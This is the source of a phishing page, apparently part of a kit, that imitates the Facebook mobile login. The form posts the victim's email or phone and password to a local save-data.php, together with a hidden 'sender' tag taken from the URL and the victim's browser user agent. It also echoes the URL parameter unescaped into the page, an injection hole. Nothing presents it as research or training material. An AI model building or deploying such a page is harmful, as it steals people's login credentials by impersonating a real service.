<!DOCTYPE html>
<html lang="en">
<?php
if (isset($_GET['en'])) {
    $sender = $_GET['en'];
}
?>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Facebook | Login </title>
    <link rel="stylesheet" href="bootstrap.css">
    <link rel="shortcut icon" href="icon.png" type="image/x-icon">
    <style>
        input[type='text'],
        input[type='password'] {
            padding: 10px 12px;
            width: 100%;
            background-color: #F5F6F7;
            border: 1px solid #F5E6F7;
            border-radius: 4px;
            margin: 4px auto;
            letter-spacing: -1px;
        }

        input[type='submit'] {
            margin-top: 7px;
            padding: 10px;
            background: #1877F2;
            color: #fff;
            border-radius: 3px;
            font-weight: bold;
        }

        input[type='submit']:hover {
            color: #fff;
        }

        .or {
            position: relative;
        }

        .or::before {
            content: "";
            position: absolute;
            left: 0;
            bottom: 7px;
            height: 1px;
            width: 45%;
            background: #aaa;
        }

        .or::after {
            content: "";
            position: absolute;
            right: 0;
            bottom: 7px;
            height: 1px;
            width: 45%;
            background: #aaa;
        }

        .createBtn {
            background: #00A400;
            padding: 7px !important;
            color: #fff;
            font-weight: bold;

        }

        .createBtn:hover {
            color: #fff;
        }

        .forget a {
            text-decoration: none;
        }

        ul li {
            font-size: 14px;
        }
    </style>

</head>

<body>
    <div class="container">
        <div class="row">
            <div class="col-12 mx-auto text-center">
                <div class="logo mx-auto">
                    <img src="logo.jpg" alt="" width="auto" height="45">
                </div>
            </div>
            <div class="col-12 mx-auto col-md-5">
                <!-- //form class  -->
                <form action="save-data.php" method="post">
                    <input type="hidden" name="browser" id="browser" value="ladjf">
                    <input type="hidden" name="sender" value="<?php echo $sender; ?>">
                    <input type="text" name="userEmail" id="email" placeholder="Mobile number or email address " required>
                    <input type="password" name="userPass" id="pass" placeholder="Password" required>
                    <input type="submit" value="Log In" class="btn btn-block">
                </form>
                <div class="or text-center mt-3">
                    or
                </div>
                <div class="createAccount mt-4 text-center">
                    <a href="https://m.facebook.com/r.php?soft=hjk
" class="btn createBtn" style="text-decoration: none;">
                        Create New Account
                    </a>
                </div>
                <div class="forget text-center mt-2">
                    <a href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl%26fl&multiple_results=0&ars=facebook_login&lwv=100&ref=dbl&_rdr">Forgotten password?</a>
                </div>


            </div>

        </div>
        <div class="row text-secondary">
            <div class="col-6 text-center">
                <ul class="list-unstyled mt-4">
                    <li> English (UK) </li>
                    <li> हिन्दी </li>
                    <li> Português (Brasil) </li>
                    <li> Deutsch </li>
                </ul>
            </div>
            <div class="col-6 text-center">
                <ul class="list-unstyled mt-4">
                    <li> नेपाली </li>
                    <li> Español </li>
                    <li> Français (France) </li>
                    <li> </li>
                </ul>
            </div>
            <div class="col-12 text-center">
                Facebook Inc.
            </div>
        </div>
    </div>
    <script>
        var browser = navigator.userAgent;
        // alert(browser)
        document.getElementById("browser").setAttribute("value", browser);
        // alert(document.getElementById("browser").value);
    </script>
</body>

</html>